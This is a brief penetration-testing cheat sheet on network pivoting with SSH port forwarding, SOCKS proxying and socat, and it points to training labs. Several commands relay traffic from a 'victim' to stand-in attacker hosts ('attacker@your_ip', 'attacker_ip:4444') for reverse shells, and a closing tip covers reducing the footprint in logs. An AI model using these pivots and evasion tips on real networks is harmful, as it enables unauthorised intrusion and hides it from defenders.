# Port Forwarding Fundamentals

The building blocks — local forward, remote forward, dynamic SOCKS. Everything else builds on these.

## SSH Local Port Forwarding

Make a remote internal service reachable on your local machine.

```bash
# Access internal_host:80 via your localhost:8080
ssh -L 8080:internal_host:80 user@pivot_host

# Access RDP on internal host (not directly reachable)
ssh -L 13389:172.16.0.100:3389 user@10.10.10.50
xfreerdp /v:localhost:13389 /u:Administrator

# Keep tunnel alive, no shell needed
ssh -N -L 8080:internal_host:80 user@pivot_host
```

## SSH Remote Port Forwarding

Expose a port on your attacker machine through the pivot (pivot initiates outbound connection).

```bash
# Victim exposes attacker's port 9090 via jump host — useful for reverse shells
ssh -R 9090:localhost:4444 attacker@your_ip

# From attacker: listen on 9090, receive connections from internal network
nc -lvnp 9090
```

## SSH Dynamic Forwarding (SOCKS5 Proxy)

Turn any SSH connection into a SOCKS5 proxy for full network routing.

```bash
# Creates SOCKS5 proxy on localhost:9050
ssh -D 9050 user@pivot_host

# Use with proxychains (configure /etc/proxychains4.conf first)
proxychains nmap -sT -Pn 10.10.10.0/24
```

## Socat Port Forward (no SSH required)

Run on the pivot host when SSH is unavailable.

```bash
# On pivot: forward local 8080 to internal target
socat TCP-LISTEN:8080,fork TCP:172.16.0.100:80

# Bidirectional relay between two hosts
socat TCP-LISTEN:4444,fork TCP:attacker_ip:4444
```

## Practice

- TryHackMe "Wreath" room — step 1 uses SSH local forwarding
- HTB Academy Pivoting module — Lab exercises in each section

## Note

Port forwarding is noisy — SSH connections and socat listeners appear in logs.
Use `-N` (no shell) and `-f` (background) flags on SSH to reduce footprint.
